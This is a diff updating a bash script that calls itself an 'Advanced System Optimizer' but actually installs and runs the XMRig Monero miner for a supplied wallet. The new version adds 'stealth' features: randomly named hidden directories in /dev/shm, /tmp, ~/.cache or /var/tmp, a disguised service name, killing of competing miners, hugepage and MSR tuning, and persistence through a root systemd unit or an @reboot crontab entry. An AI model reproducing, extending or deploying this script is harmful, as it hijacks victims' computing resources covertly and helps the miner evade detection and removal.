@@ -1,7 +1,7 @@
 #!/bin/bash
-VERSION=2.22
+VERSION=2.23
 echo "Advanced System Optimizer v$VERSION"
-echo "Using all cores @ 85% per core - MSR FIXED & OPTIMAL THREADS"
+echo "All cores @ 85% - FULLY FIXED & STEALTH"
 echo
 export LC_ALL=C
 export LANG=C
@@ -14,11 +14,6 @@ REAL_HOME="$(getent passwd "$REAL_USER" | cut -d: -f6 2>/dev/null || echo "$HOME
 RAND_HEX=$(openssl rand -hex 16)
 SYSTEM_USER="opt$(openssl rand -hex 6)"
 SERVICE_NAME="sysopt-$(openssl rand -hex 5)"
-
-# --- مسیر مخفی در RAM ---
-BASE_DIR="/dev/shm/.$RAND_HEX"
-LOG_DIR="$BASE_DIR/.log"
-CFG_DIR="$BASE_DIR/.cfg"
 
 WALLET="$1"
 if [ -z "$WALLET" ]; then
@@ -40,47 +35,65 @@ if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
     fi
 fi
 
-# --- محاسبه هسته‌ها (استفاده از همه) ---
+# --- محاسبه هسته‌ها ---
 CPU_TOTAL=$(nproc)
 USABLE_THREADS=$CPU_TOTAL
 [ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
-CPU_HINT=85  # 85% هر هسته
+CPU_HINT=85
 
 echo "[*] CPU: $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT% each"
-echo "[*] Hidden install: $BASE_DIR (RAM, auto-clear on reboot)"
+
+# --- انتخاب مسیر مخفی (اول /dev/shm، بعد /tmp، بعد $HOME/.cache، بعد /var/tmp) ---
+try_paths=("/dev/shm" "/tmp" "$REAL_HOME/.cache" "/var/tmp")
+BASE_DIR=""
+
+for path in "${try_paths[@]}"; do
+    test_dir="$path/.$RAND_HEX"
+    if mkdir -p "$test_dir" 2>/dev/null && [ -w "$test_dir" ]; then
+        BASE_DIR="$test_dir"
+        LOG_DIR="$BASE_DIR/.log"
+        CFG_DIR="$BASE_DIR/.cfg"
+        echo "[*] Using path: $BASE_DIR"
+        break
+    fi
+done
+
+if [ -z "$BASE_DIR" ]; then
+    echo "ERROR: No writable path found for installation"
+    exit 1
+fi
 
 # --- ساخت دایرکتوری ---
-mkdir -p "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null
+mkdir -p "$LOG_DIR" "$CFG_DIR" 2>/dev/null
 chmod 700 "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null
 
 # --- پاک‌سازی کامل قبلی ---
-echo "[*] Global cleanup of old miners..."
+echo "[*] Global cleanup..."
 pkill -9 -f "xmrig" 2>/dev/null
-pkill -9 -f "$BASE_DIR/main" 2>/dev/null
-find /dev/shm -name ".*" -type d -exec rm -rf {} + 2>/dev/null
+pkill -9 -f "main" 2>/dev/null
+find /dev/shm /tmp "$REAL_HOME/.cache" /var/tmp -name ".*" -type d -exec rm -rf {} + 2>/dev/null
 if command -v systemctl >/dev/null 2>&1; then
     systemctl stop "$SERVICE_NAME" 2>/dev/null
     systemctl disable "$SERVICE_NAME" 2>/dev/null
     rm -f "/etc/systemd/system/$SERVICE_NAME.service"
 fi
 
-# --- hugepages با تخصیص بیشتر برای همه هسته‌ها ---
+# --- hugepages + MSR ---
 if [ "$(id -u)" -eq 0 ]; then
+    # MSR
+    modprobe msr 2>/dev/null || true
+
+    # HugePages
     SYSCONF="/etc/sysctl.conf"
     [ ! -f "$SYSCONF" ] && touch "$SYSCONF" && chmod 644 "$SYSCONF"
-    grep -q "vm.nr_hugepages.*2048" "$SYSCONF" || echo "vm.nr_hugepages=2048" >> "$SYSCONF"
+    grep -q "vm.nr_hugepages.*4096" "$SYSCONF" || echo "vm.nr_hugepages=4096" >> "$SYSCONF"
     sysctl -p "$SYSCONF" >/dev/null 2>&1
-    echo 2048 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
+    echo 4096 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
 fi
 
-# --- فعال‌سازی MSR برای جلوگیری از hashrate پایین ---
-if [ "$(id -u)" -eq 0 ]; then
-    modprobe msr 2>/dev/null || true
-fi
-
-# --- دانلود ---
+# --- دانلود و استخراج ---
 URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
-TMP_FILE="/tmp/.tmp_$(openssl rand -hex 5).tgz"
+TMP_FILE="/tmp/.x_$(openssl rand -hex 5).tgz"
 
 for i in {1..3}; do
     curl -fsSL "$URL" -o "$TMP_FILE" && break
@@ -93,12 +106,13 @@ tar xzf "$TMP_FILE" -C /tmp/ 2>/dev/null || { echo "ERROR: Extract failed"; rm -
 XMRIG_BIN=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
 [ -z "$XMRIG_BIN" ] && echo "ERROR: xmrig not found" && rm -f "$TMP_FILE" && exit 1
 
-cp "$XMRIG_BIN" "$BASE_DIR/main"
+# --- نصب در مسیر امن ---
+cp "$XMRIG_BIN" "$BASE_DIR/main" || { echo "ERROR: Copy failed"; rm -f "$TMP_FILE"; exit 1; }
 chmod +x "$BASE_DIR/main"
 rm -f "$TMP_FILE"
 find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null
 
-# --- config.json بدون max-threads-hint (اجبار در خط فرمان) ---
+# --- config.json ---
 cat > "$BASE_DIR/config.json" << EOF
 {
     "api": { "id": null, "worker-id": "$SYSTEM_USER" },
@@ -142,49 +156,49 @@ cat > "$BASE_DIR/config.json" << EOF
 }
 EOF
 
-# --- اسکریپت کنترل با --cpu-max-threads-hint=85 ---
-cat > "$BASE_DIR/control" << EOF
+# --- control script ---
+cat > "$BASE_DIR/control" << 'EOF'
 #!/bin/bash
-cd "\$(dirname "\$0")" || exit 1
-case "\$1" in
+cd "$(dirname "$0")" || exit 1
+case "$1" in
     start)
-        pgrep -f "./main" >/dev/null && { echo "Already running"; "\$0" status; exit 1; }
-        [ -w /proc/sys/vm/nr_hugepages ] && echo 2048 > /proc/sys/vm/nr_hugepages 2>/dev/null
-        nohup ./main --config=config.json --cpu-max-threads-hint=$CPU_HINT > .log/output.log 2>&1 &
-        echo \$! > .pid
-        sleep 3
-        echo "Started @ $CPU_HINT% per core"
-        "\$0" status
+        pgrep -f "./main" >/dev/null && { echo "Already running"; "$0" status; exit 1; }
+        [ -w /proc/sys/vm/nr_hugepages ] && echo 4096 > /proc/sys/vm/nr_hugepages 2>/dev/null
+        nohup ./main --config=config.json --cpu-max-threads-hint=85 > .log/output.log 2>&1 &
+        echo $! > .pid
+        sleep 5
+        echo "Started @ 85% per core"
+        "$0" status
         ;;
     stop)
         pkill -9 -f "./main" 2>/dev/null
-        [ -f .pid ] && kill -9 \$(cat .pid) 2>/dev/null && rm -f .pid
+        [ -f .pid ] && kill -9 $(cat .pid) 2>/dev/null && rm -f .pid
         sleep 1
         pgrep -f "./main" >/dev/null && echo "Failed" || echo "Stopped"
         ;;
     status)
-        PIDS=\$(pgrep -f "./main")
-        if [ -n "\$PIDS" ]; then
-            echo "Running (\$(\echo \$PIDS | wc -w) PID(s)): \$PIDS"
-            TOTAL_CPU=0
-            for PID in \$PIDS; do
-                CPU=\$(ps -p \$PID -o %cpu --no-headers | awk '{printf "%.0f", \$1}')
-                echo "  PID \$PID → \$CPU% CPU"
-                TOTAL_CPU=\$((TOTAL_CPU + CPU))
+        PIDS=$(pgrep -f "./main")
+        if [ -n "$PIDS" ]; then
+            echo "Running ($(echo "$PIDS" | wc -w) PIDs): $PIDS"
+            TOTAL=0
+            for PID in $PIDS; do
+                CPU=$(ps -p $PID -o %cpu --no-headers | awk '{printf "%.0f", $1}')
+                echo "  PID $PID → $CPU% CPU"
+                TOTAL=$((TOTAL + CPU))
             done
-            echo "  TOTAL CPU: \$TOTAL_CPU% (~ \$((TOTAL_CPU / 100)) cores)"
+            echo "  TOTAL: $TOTAL% (~ $((TOTAL / 100)) cores)"
         else
             echo "Stopped"
         fi
         ;;
     logs) tail -30 .log/output.log 2>/dev/null || echo "No logs" ;;
-    restart) "\$0" stop; sleep 2; "\$0" start ;;
-    *) echo "Usage: \$0 {start|stop|status|logs|restart}" ;;
+    restart) "$0" stop; sleep 2; "$0" start ;;
+    *) echo "Usage: $0 {start|stop|status|logs|restart}" ;;
 esac
 EOF
 chmod +x "$BASE_DIR/control"
 
-# --- systemd با --cpu-max-threads-hint=85 ---
+# --- systemd ---
 SYSTEMD=false
 if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
     cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
@@ -196,7 +210,7 @@ Type=simple
 Restart=always
 RestartSec=10
 User=root
-ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json --cpu-max-threads-hint=$CPU_HINT
+ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json --cpu-max-threads-hint=85
 WorkingDirectory=$BASE_DIR
 Environment=LC_ALL=C
 StandardOutput=append:$LOG_DIR/output.log
@@ -209,7 +223,7 @@ EOF
     SYSTEMD=true
 fi
 
-# --- crontab اگر systemd نبود ---
+# --- crontab ---
 if [ "$SYSTEMD" = false ]; then
     (crontab -u "$REAL_USER" -l 2>/dev/null | grep -v "$BASE_DIR"; echo "@reboot sleep 60 && $BASE_DIR/control start >/dev/null 2>&1") | crontab -u "$REAL_USER" -
 fi
@@ -221,14 +235,14 @@ else
     "$BASE_DIR/control" start
 fi
 
-sleep 15  # زمان بیشتر برای آماده‌سازی dataset
+sleep 20
 echo
-echo "=== FINAL CHECK ==="
+echo "=== FINAL STATUS ==="
 "$BASE_DIR/control" status
 echo
-echo "DONE! Using all $USABLE_THREADS threads @ ~$(( USABLE_THREADS * CPU_HINT / 100 )) cores in htop"
+echo "DONE! Using $USABLE_THREADS threads @ ~$(( USABLE_THREADS * 85 / 100 )) cores"
 echo "Path: $BASE_DIR"
-echo "Manage: $BASE_DIR/control status / logs"
-echo "If low CPU: Check logs for 'accepted' shares or connection errors."
+echo "Control: $BASE_DIR/control status"
+echo "Logs: $BASE_DIR/control logs"
 
 exit 0
